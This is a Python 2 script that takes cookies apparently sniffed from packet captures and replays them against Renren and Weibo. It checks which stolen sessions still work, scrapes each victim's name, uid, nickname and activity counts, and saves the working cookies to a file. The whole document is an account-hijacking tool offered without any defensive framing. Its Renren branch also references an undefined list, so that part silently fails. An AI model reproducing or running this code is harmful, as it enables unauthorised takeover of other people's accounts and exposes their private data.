#coding=utf-8
import re
import os
from os import system
import urllib2
import urllib
import cookielib

melist=[]
weibo_namelist=[]
def renrenBrowser(cookie,f1):
        try:
                url="http://www.renren.com"
                cookiejar=cookielib.CookieJar()
                req = urllib2.Request(url)
                req.add_header('Cookie', cookie)
                data = urllib2.urlopen(req).read()
                name_pattern=re.compile(r'(?<=<title>人人网 - )[\S]*(?=</title>)')
                name=name_pattern.search(data).group(0)
                coming_pattern=re.compile(r'(?<=最近来访<span> )[\d]+')
                coming=coming_pattern.search(data).group(0)
                consist_pattern=re.compile(r'(?<=>)[\d]+(?=天</)')
                consist=consist_pattern.search(data).group(0)
                if len([names for names in renren_namelist if names==name])==0:
                        f1.write('------人人网账号COOKIE------')
                        f1.write('The Name is: \t'+name)
                        f1.write('The Total view is : \t'+coming)
                        f1.write('The Total Consist Login is : \t'+consist)
                        renren_namelist.append(name)
                        f1.write(name+'\t'+url+'\t'+cookie+'\n')
        except Exception as e:
                pass
def weiboBrowser(cookie,f1):
        try:
                url="http://www.weibo.com"
                cookiejar=cookielib.CookieJar()
                req = urllib2.Request(url)
                req.add_header('Cookie', cookie)
                data = urllib2.urlopen(req).read()
                uid_pattern=re.compile(r'(?<=\$CONFIG\[\'uid\'\] = )[\'\d]+(?=;)')
                uid=uid_pattern.search(data).group(0)
                name_pattern=re.compile(r'(?<=\$CONFIG\[\'nick\'\] = )[\S]+(?=;)')
                name=name_pattern.search(data).group(0)
                if len([names for names in weibo_namelist if names==name])==0:
                        f1.write('++++++微博账号COOKIE++++++')
                        f1.write('Uid is : '+uid)
                        f1.write('Nick name is :'+name)
                        weibo_namelist.append(name)
                        f1.write(name+'\t'+url+'\t'+cookie+'\n')
        except Exception as e:
                pass


system("sort /var/sec/pcap_cookie_ -u >/var/sec/pcap_cookie_tmp")
cookie_file=open('/var/sec/pcap_cookie_tmp','r')
f1=open('/var/sec/pcap_cookie','aw')
for line in cookie_file:
        s=line.split('\t')
        url=s[0]
        cookie=s[1]
        domain_pattern=re.compile(r'[a-zA-Z\-\d]*.com')
        domain_group=domain_pattern.search(url)
        if domain_group:
                domain=domain_group.group(0)
                if domain=='renren.com':
                        renrenBrowser(cookie,f1)
                if domain=='weibo.com':
                        weiboBrowser(cookie,f1)
                if domain=='douban.com':
                       # doubanBrowser(cookie,f1)
			pass
cookie_file.close()
f1.close()

